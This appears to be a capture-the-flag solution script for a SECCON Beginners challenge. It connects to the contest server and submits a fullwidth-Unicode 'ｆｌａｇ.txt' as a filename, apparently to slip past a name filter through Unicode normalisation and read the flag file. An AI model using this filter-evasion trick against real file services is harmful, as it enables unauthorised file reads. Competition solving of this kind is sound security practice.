from __future__ import annotations

import socket


HOST = "viewer.beginners.seccon.games"
PORT = 33458
PAYLOAD = "ｆｌａｇ.txt"


def recv_until(sock: socket.socket, marker: bytes) -> bytes:
    data = bytearray()
    while not data.endswith(marker):
        chunk = sock.recv(4096)
        if not chunk:
            break
        data.extend(chunk)
    return bytes(data)


def main() -> None:
    with socket.create_connection((HOST, PORT), timeout=10) as sock:
        recv_until(sock, b"filename > ")
        sock.sendall(PAYLOAD.encode("utf-8") + b"\n")

        response = bytearray()
        while chunk := sock.recv(4096):
            response.extend(chunk)

    print(response.decode("utf-8", errors="replace").strip())


if __name__ == "__main__":
    main()
